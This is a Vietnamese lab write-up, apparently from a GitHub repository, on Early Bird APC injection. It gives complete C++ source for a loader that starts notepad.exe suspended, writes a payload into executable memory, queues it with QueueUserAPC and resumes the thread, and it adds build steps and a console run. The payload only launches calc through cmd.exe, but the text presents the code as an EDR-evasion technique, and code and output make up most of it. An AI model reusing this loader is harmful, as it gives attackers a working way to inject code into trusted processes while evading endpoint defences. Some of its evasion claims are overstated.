<img width="1920" height="1140" alt="devenv_jprqlcA5Fm" src="https://github.com/user-attachments/assets/40e3e5ad-7eda-4f20-a470-13deb26d0102" />
---

# 📝 [PE 11] APC Injection (Early Bird Variant)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**APC Injection (Biến thể Early Bird)** đại diện cho một giải thuật tiêm nhiễm mã máy bất đồng bộ ở mức độ nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ động tại thời điểm sơ khởi tiến trình (Process Initialization Evasion)**.

Hầu hết các giải pháp Endpoint Detection and Response (EDR) hiện đại đều thiết lập các hàm móc (User-mode Hooks) bằng cách nạp DLL giám sát của họ vào bên trong các tiến trình mới sinh nhằm theo dõi hành vi tạo luồng lạ (`CreateRemoteThread`). Dự án PE 11 hóa giải bài toán này bằng cách khai thác cơ chế **Asynchronous Procedure Call (APC)** mặc định của Windows Subsystem, phối hợp với trạng thái đóng băng tiến trình sơ khởi (`CREATE_SUSPENDED`).

Bằng cách đưa Payload vào hàng đợi APC của luồng chính ngay khi cấu trúc tiến trình vừa được hình thành, Loader ép Kernel hệ điều hành tự động triệu hồi và thực thi mã máy của ta **trước** khi điểm nhập thực tế (`AddressOfEntryPoint`) của ứng dụng được kích hoạt, đồng thời đi trước một bước trước khi các phân hệ giám sát của EDR kịp thiết lập hàng rào bảo vệ (Hooking Placement). Kỹ thuật này triệt tiêu hoàn toàn sự hiện diện của các API tạo luồng lộ liễu, mang lại độ ẩn mình tối cao cho Payload.

### 🎯 Mục tiêu nghiên cứu:

* **Làm chủ cơ chế điều phối bất đồng bộ (APC Queue)**: Thấu suốt cách thức cấu trúc luồng của Windows quản lý và xử lý các hàm callback tồn đọng trong không gian ảo.
* **Đánh chặn chu kỳ khởi thủy (Early-stage Execution)**: Thực nghiệm kiểm chứng việc chiếm quyền điều phối CPU tại thời điểm giao thoa giữa Kernel-mode initialization và User-mode execution.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc hệ điều hành Windows, mỗi một luồng (Thread) được đại diện bởi một cấu trúc dữ liệu ở tầng Kernel và sở hữu riêng một hàng đợi gọi là **APC Queue**. Khi một luồng bước vào trạng thái có thể cảnh báo (Alertable State) hoặc khi luồng chính của một tiến trình chuẩn bị chuyển trạng thái từ đóng băng sang thực thi, Kernel Windows có trách nhiệm quét sạch hàng đợi này để xử lý các hàm xử lý bất đồng bộ được gửi từ trước.

Quy trình toán học điều phối dòng chảy CPU của Lab PE 11 diễn ra qua 4 giai đoạn ngầm tại tầng Kernel:

```
[CreateProcessW: Trạng thái đóng băng CREATE_SUSPENDED]
       └──> [VirtualAllocEx: Ánh xạ cấu trúc mã máy Payload và tham số]
                 └──> [QueueUserAPC: Gài cấu trúc APC chéo RAM vào hàng đợi luồng chính]
                           └──> [ResumeThread: Kernel tự động kích nổ APC trước EntryPoint]

```

1. **Khởi tạo chu kỳ sơ khởi (`CREATE_SUSPENDED`)**: Tiến trình vỏ bọc được nạp lên RAM dưới dạng một "xác rỗng" (Empty Shell). Luồng chính được khởi tạo nhưng bị hoãn lệnh ngay tại vạch xuất phát của hệ thống. Lúc này, không gian ảo của tiến trình hoàn toàn phẳng sạch, chưa hề thực thi bất kỳ một byte mã máy nào của file thực thi gốc hay mô-đun giám sát bên thứ ba.
2. **Ánh xạ cấu trúc tham số tuyệt đối**: Do hàm callback APC trên kiến trúc x64 chỉ nhận duy nhất một tham số đầu vào (`ULONG_PTR`), Loader tiến hành đóng gói địa chỉ hàm API cần gọi và chuỗi lệnh thực thi vào một cấu trúc dữ liệu duy nhất (`THREAD_DATA`), ánh xạ song song mã máy và cấu trúc này sang bộ nhớ đối phương nhằm triệt tiêu lỗi địa chỉ tương đối RIP-Relative.
3. **Gài mìn hàng đợi hệ thống (`QueueUserAPC`)**: Hàm API này phát lệnh xuống nhân Kernel để chèn một thực thể cấu trúc `KAPC` mới vào hàng đợi APC của luồng chính `pi.hThread`. Tham số `pfnAPC` được trỏ đến địa chỉ vùng nhớ thực thi từ xa `remoteCodeBuffer`, và tham số `dwData` được nạp tọa độ vùng nhớ chứa tham số tuyệt đối `pRemoteData`.
4. **Kích nổ tự động từ tầng Kernel (`ResumeThread`)**: Khi Loader phát lệnh rã đông luồng, trình lập lịch (Scheduler) của Kernel Windows phát hiện luồng chính có thông điệp APC đang xếp hàng chờ sẵn. Trước khi trả quyền điều khiển về cho User-mode tại điểm EntryPoint gốc, Kernel lập tức điều hướng con trỏ chỉ mục lệnh CPU sang thực thi phân vùng mã máy của ta trước để giải phóng hàng đợi, hoàn thành dứt điểm chiến dịch Evasion.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa đo đạc phân vùng hệ thống thông qua `GetSystemDirectoryW`, bảo đảm tính tương thích và phòng thủ cấu trúc tuyệt đối trên mọi phiên bản Windows 11.

### Source.cpp
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối gánh luồng xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ gánh luồng chạy khi APC kích nổ
DWORD WINAPI RemoteApcPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật tự động định vị vị trí thư mục hệ thống thực tế (Zero Static Buffers)
std::wstring GetActiveSystemTarget(const std::wstring& exeName) {
    // Bước 1: Truyền con trỏ NULL để OS tự tính kích thước vùng nhớ cần thiết
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Bước 2: Cấp phát động mảng vừa vặn đến từng byte để hứng chuỗi
    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; // Ghép toán học chuỗi tên tiến trình vỏ bọc
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 11: APC QUEUE EARLY BIRD INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế, không gán cứng
    std::wstring targetExeName = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemTarget(targetExeName);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG (EARLY BIRD) ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(dynamicPath.c_str()), // Nạp chuỗi đường dẫn chủ động thích ứng
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Giữ chặt luồng chính ngay tại vạch xuất phát hệ thống
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] Failed to create suspended process. Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao thanh cong! PID: " << pi.dwProcessId << " | ThreadID: " << pi.dwThreadId << std::endl;

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít đến từng byte
    SIZE_T functionSize = 500;

    // ─── BƯỚC 2: CẤP PHÁT BỘ NHỚ VÀ ÁNH XẠ LOGIC HÀM SANG RAM NOTEPAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo tham số cấu trúc tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy xuyên biên giới dữ liệu và mã máy vào lòng xác rỗng Notepad
    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)RemoteApcPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ham va tham so vao xac rong hoan tat." << std::endl;

    // ─── BƯỚC 3: GÀI HÀM CỦA TA VÀO HÀNG ĐỢI APC TIẾN TRÌNH ĐÍCH ───
    std::cout << "[*] Dang thuc hien gai ham vao hang doi QueueUserAPC cua luong..." << std::endl;

    // Ép luồng đích gài remoteCodeBuffer làm thủ tục xử lý kế tiếp, truyền pRemoteData làm tham số
    DWORD apcResult = QueueUserAPC((PAPCFUNC)remoteCodeBuffer, pi.hThread, (ULONG_PTR)pRemoteData);

    if (apcResult == 0) {
        std::cerr << "[-] QueueUserAPC failed! Error code: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Gai hang doi APC thanh cong!" << std::endl;

    // ─── BƯỚC 4: RÃ ĐÔNG LUỒNG ĐỂ TIẾN TRÌNH TỰ ĐỘNG LÔI APC RA THỰC THI ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread). Luong he thong se tu dong kich no APC..." << std::endl;
    ResumeThread(pi.hThread);

    // Sử dụng cờ chờ đợi kết thúc đồng bộ để đảm bảo dọn dẹp phẳng sạch
    std::cout << "\n[+] APC Queue Early Bird Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();

    // Thu hồi tài nguyên hệ thống phẳng sạch chống Memory Leak
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc tệp tin thực thi đạt trạng thái độc lập tuyến tính, nhúng toàn vẹn thư viện liên kết động nhằm tối ưu hóa khả năng vận hành độc lập trên môi trường VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính `Runtime Library`, chuyển thông số sang cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân chuẩn chỉ.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khai hỏa file thực thi Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng thuật toán can thiệp hàng đợi bất đồng bộ:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE11_APC_QUEUE_INJECTION\x64\Release> C:\Users\Admin\source\repos\Task6\PE11_APC_QUEUE_INJECTION\x64\Release\APC_QUEUE_INJECTION.exe
====================================================
[*] PE 11: APC QUEUE EARLY BIRD INJECTION
====================================================
[+] Da chu dong dinh vi tien trinh vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang...
[+] Tien trinh vo boc duoc tao thanh cong! PID: 16860 | ThreadID: 1756
[+] Vung nho Code RWX cua payload dat tai: 0x000001C717C10000
[+] Anh xa logic ham va tham so vao xac rong hoan tat.
[*] Dang thuc hien gai ham vao hang doi QueueUserAPC cua luong...
[+] Gai hang doi APC thanh cong!
[*] Kich hoat ra dong (ResumeThread). Luong he thong se tu dong kich no APC...

[+] APC Queue Early Bird Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

### Demo:
<img width="1920" height="1080" alt="devenv_jprqlcA5Fm" src="https://github.com/user-attachments/assets/d901e6c0-96bb-4d7c-9008-9991cbefdc5e" />


### 🎯 Phân tích hệ quả cấu trúc RAM:

* Khi lệnh rã đông `ResumeThread` được phát ra, luồng hệ thống chuyển trạng thái ngữ cảnh. Kernel Windows phát hiện danh sách thông điệp APC tồn đọng trong cấu trúc luồng, lập tức bốc tọa độ `remoteCodeBuffer` lên CPU thực thi trước khi chuyển giao quyền kiểm soát về User-mode tại điểm EntryPoint gốc.
* Ứng dụng Máy tính **`calc.exe` được kích nổ mở bung hiên ngang rực rỡ kịch trần kịch khung** lọt lòng inside không gian bộ nhớ ảo của Notepad. Hành vi này hoàn toàn mượt mà, không sinh luồng phụ bất thường, đi trước tốc độ thiết lập hàng rào của các phần mềm an ninh, bypass hoàn toàn các bộ lọc Hooking truyền thống một cách mỹ mãn!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn**: *QueueUserAPC function (processthreadsapi.h)* - [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
* **Veritas**: *Asynchronous Procedure Calls (APCs) Internals* - [https://www.corelan.be/](https://www.corelan.be/)
* **Mark Russinovich**: *Windows Internals, Part 1 (7th Edition)* - Chapter 3: System Mechanisms - Thread Scheduling and Dispatching.
* **CyberBit Research**: *The "Early Bird" Code Injection Technique* - Analysis on EDR Bypassing.

--- 
